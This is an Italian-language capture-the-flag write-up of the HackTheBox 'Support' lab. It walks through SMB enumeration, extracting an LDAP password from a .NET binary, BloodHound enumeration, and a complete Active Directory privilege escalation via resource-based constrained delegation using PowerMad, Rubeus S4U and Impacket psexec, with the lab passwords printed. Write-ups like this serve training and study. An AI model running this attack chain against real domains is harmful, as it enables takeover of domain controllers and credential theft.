# Support

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con _nmapAutomator_.

```text
sudo nmapAutomator.sh --host 10.10.11.174 --type All
```

Il risultato della scansione è il seguente:

```text
Host is likely running Windows


---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl


---------------------Starting Script Scan-----------------------

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-18 09:12:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: -3s
| smb2-time:
|   date: 2024-01-18T09:12:16
|_  start_date: N/A


---------------------Starting Full Scan------------------------

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49676/tcp open  unknown
49679/tcp open  unknown
49776/tcp open  unknown


Making a script scan on extra ports: 5985, 9389, 49664, 49667, 49676, 49679, 49776


PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf     .NET Message Framing
49664/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc      Microsoft Windows RPC
49776/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


----------------------Starting UDP Scan------------------------

PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

PORT    STATE SERVICE      VERSION
53/udp  open  domain       (generic dns response: SERVFAIL)
| fingerprint-strings:
|   NBTStat:
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-18 09:19:00Z)
123/udp open  ntp          NTP v3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Dal risultato della scansione, questa macchina sembra essere un Domanin Controller. Purtroppo non emerge nulla di troppo interessante sulle porte trovate.

Seguirò la seguente scaletta per cercare informazioni:
  - Prima parte:
    - SMB
    - LDAP
  - Seconda parte:
    - Kerberos
    - DNS
    - RPC
  - Terza parte:
    - WinRM

Aggiungo _support.htb_ e _dc.support.htb_ al file _/etc/hosts_ e passo alla fase successiva.

## Enumeration
Parto da SMB utilizzando _smbclient_:

```bash
smbclient -L "//10.10.11.174/"
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-1.png"/>
</p>

Provo a connettermi alle varie share ma riesco solo per "NETLOGON", "SYSVOL" e "support-tools". Soltanto sull'utlima trovo qualcosa di interessante:

```bash
smbclient -N //support.htb/support-tools
```
<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-2.png"/>
</p>

Trasferisco il file "UserInfo.exe.zip" sulla mia macchina ed estraggo il contenuto:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-3.png"/>
</p>

Per studiare il funzionamento dell'eseguibile "UserInfo.exe" mi sposto in ambiente windows.

Provo ad eseguirlo:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-4.png"/>
</p>

Faccio un tentativo utilizzando il comando user:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-5.png"/>
</p>

Scopro che vuole l'opzione "-username", quindi riprovo aggiungendola:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-6.png"/>
</p>

Viene generata un'eccezzione che mi comunica che il server non è operativo. Questo perchè mi sono dimenticato di connettere anche la macchina Windows alla VPN e di aggiornare il file "C:\Windows\System32\drivers\etc\hosts".

Quindi rilancio il comando:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-7.png"/>
</p>

Ora sembra funzionare.

Dopo aver effettuato diversi tentativi sia con il comando "user" che con il comand "find" riesco ad ottenre una lista di utenti:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-8.png"/>
</p>

Se si cerca il singolo utente si ottengono delle informazioni legate ad esso:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-9.png"/>
</p>

Provo quindi ad utilizzare _wireshark_ per provare a catturare la password di autenticazione LDAP. Purtroppo su ambiente operativo Windows non riesco ([qui](https://0xdf.gitlab.io/2022/12/17/htb-support.html#auth-as-ldap) una spiegazione del perchè).

Provo quindi con l'analisi statica dell'eseguibile tramite il tool _DNSpy_. Qui trovo una password nella sezione "Protected":

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-10.png"/>
</p>

Trovo anche un username:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-11.png"/>
</p>

Individuo un punto nella sezione "LdapQuery" dove posizionare un breakpoint per poter leggere la password generata dall'esecuzione:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-12.png"/>
</p>

Quindi ottengo la seguente password:

```text
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

A questo punto utilizzo _bloodhound_ per avere un quadro completo del dominio. In particolare, sfrutto la versione python per ricavare le informazioni da caricare sul programma:

```bash
bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-13.png"/>
</p>

Così scopro che l'utente _support_ fa parte del gruppo "Remote Management Users".

Sucessivamente, utilizzo _ldapdomaindump_ per ricavare delle informazioni dalla macchina vittima:

```bash
ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap
```

Nel file "domain_users.json" scopro una probabile password e tento l'accesso tramite l'utilizzo del tool _evil-winrm_:

```bash
evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-14.png"/>
</p>

**Trovo così il primo flag!**

## Privilege Escalation
Ritorno su _bloodhound_ per trovare una strategia utile per elevare i miei privilegi:

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-15.png"/>
</p>

L'utente _support_ fa parte del gruppo "Shared Support Accounts" che ha privilegi di tipo "GenericAll" sul DC. Quindi, ispezionando la sezione "help" sul collegamento tra il gruppo e il DC, scopro di poter utilizzare l'attacco [Resource Based ConstrainedDelegation (RBCD)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation) per elevare i miei privilegi.

Quest'attacco consiste nella creazione di una nuovo computer all'interno del dominio. Una volta creato, è possibile inviare una richiesta per un ticket TGT impersonificando un utente con alti privilegi sul dominio (ad esempio l'Administrator). Successivamente, utilizzando la tecnica Pass the Ticket (PtT) è possibile autenticarsi come utente con alti privilegi.

Occorrono 3 prerequisiti per poter utilizzare l'attacco RBCD:
  - Avere a disposizione una shell di un utente appartenente al gruppo (Shared Support Accounts) per poter creare un computer sul dominio.
  - L'attributo "ms-ds-machineaccountquota", che controlla il numero di computer che possono esserre aggiunti dall'utente in questione, deve essere maggiore di 0.
  - L'utente o il gruppo deve/devono avere privilegi in scrittura (GenericAll, WriteDACL).

Per controllare il dato relativo all'attributo "ms-ds-machineaccountquota" importo il modulo "[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)" per poter sfruttare la powershell tramite _evil-winrm_:

```text
upload PowerView.ps1
```

E lo attivo in questo modo:

```text
. ./PowerView.ps1
```

Successivamente utilizzo il seguente comando:

```text
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-16.png"/>
</p>

Controllo anche che l'attributo "msds-allowedtoactonbehalfofotheridentity" sia vuoto:

```text
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-17.png"/>
</p>

Lo è, quindi posso procedere.

Come prima cosa, importo il modulo "[PowerMad](https://github.com/Kevin-Robertson/Powermad.git)". Poi lancio il seguente comando per creare un nuovo computer:

```text
New-MachineAccount -MachineAccount NACLAPOR -Password $(ConvertTo-SecureString 'Ciao123' -AsPlainText -Force)
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-18.png"/>
</p>

Verifico che tutto sia andato a buon fine tramite il seguente comando:

```text
Get-ADComputer -identity NACLAPOR
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-19.png"/>
</p>

Ora per eseguire l'attacco RBCD posso procedere in due modi differenti:
  - Posso effettuare il set del valore "PrincipalsAllowedToDelegateToAccount" per il computer "NACLAPOR" appena creato attraverso il modulo "PowerShell Active Directory" che a porterà al set del valore "msdsallowedtoactonbehalfofotheridentity" in maniera automatica.
  - Oppure, posso utilizzare il modulo "[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)" per effettuare direttamente il set del valore "msdsallowedtoactonbehalfofotheridentity".

Seguendo il primo metodo lancio questo comando:

```text
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount NACLAPOR$
```

Verifico che sia andato tutto a buon fine:

```text
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-20.png"/>
</p>

Verifio che l'attributo "msds-allowedtoactonbehalfofotheridentity" non sia più vuoto:

```text
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-21.png"/>
</p>

Ora l'attributo ha un valore!

Ora eseguo un attacco S4U, che mi permetterà di ottenre un ticket Kerberos collegato all'account Administrator.

Per fare ciò utilizzo [Rubeus](https://github.com/GhostPack/Rubeus/tree/master).

Per prima cosa ottengo l'hash della password collegata al computer "NACLAPOR":

```text
.\Rubeus.exe hash /password:Ciao123 /user:NACLAPOR$ /domain:support.htb
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-22.png"/>
</p>

Quindi tramite il valore _rc4_hmac_ recupero il ticket per l'amministratore:

```text
.\Rubeus.exe s4u /user:NACLAPOR$ /rc4:B53BC03B3069945DB6F3FAB66AC3AF04 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-23.png"/>
</p>

La generazione è andata a buon fine. Quindi procedo prendendo l'ultimo ticket in base64 per ottenere una shell come Administrator.

Per fare questo, copio il contenuto del ticket all'interno del file "ADTGT_b64", rimuovendo prima gli spazi bianchi. Poi lo decodifico attraverso questo comando:

```bash
base64 -d ADTGT_b64 > ADTGT
```

Utilizzo lo script "TicketConverter.py" di _Impacket_:

```bash
ticketConverter.py ADTGT ADTGT_FINAL
```

Per ottenere la shell utilizzo lo script "psexec.py":

```bash
KRB5CCNAME=ADTGT_FINAL psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

<p align="center">
  <img src="/Immagini/Windows-Box/Support/support-24.png"/>
</p>

**Ottengo così il secondo flag!**
